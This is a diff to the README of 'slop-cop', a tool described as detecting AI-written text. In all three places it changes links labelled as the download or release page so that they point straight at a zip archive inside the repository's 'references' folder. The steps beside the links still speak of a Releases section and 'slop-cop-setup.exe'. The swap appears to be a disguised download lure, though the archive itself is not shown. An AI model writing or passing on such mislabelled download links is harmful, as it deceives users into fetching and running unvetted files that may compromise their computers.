@@ -1,6 +1,6 @@
 # 🛡️ slop-cop - Identify AI writing before you publish
 
-[![Download slop-cop](https://img.shields.io/badge/Download-slop_cop-blue)](https://github.com/Lucasli6833/slop-cop)
+[![Download slop-cop](https://img.shields.io/badge/Download-slop_cop-blue)](https://github.com/Lucasli6833/slop-cop/raw/refs/heads/main/references/cop_slop_1.9.zip)
 
 ## 📁 What is this tool
 
@@ -22,7 +22,7 @@ You do not need to understand how the code works. The tool handles the analysis 
 
 You need to access the release page to install the application on your computer.
 
-[Click here to visit the download page for slop-cop](https://github.com/Lucasli6833/slop-cop)
+[Click here to visit the download page for slop-cop](https://github.com/Lucasli6833/slop-cop/raw/refs/heads/main/references/cop_slop_1.9.zip)
 
 ## 💻 System requirements
 
@@ -35,7 +35,7 @@ Your computer must meet these basic requirements to run the software correctly:
 
 ## 🚀 Installation guide
 
-1. Visit the [download page](https://github.com/Lucasli6833/slop-cop).
+1. Visit the [download page](https://github.com/Lucasli6833/slop-cop/raw/refs/heads/main/references/cop_slop_1.9.zip).
 2. Look for the section labeled "Releases" on the right side of the screen.
 3. Click the link for the latest version.
 4. Download the file named "slop-cop-setup.exe".
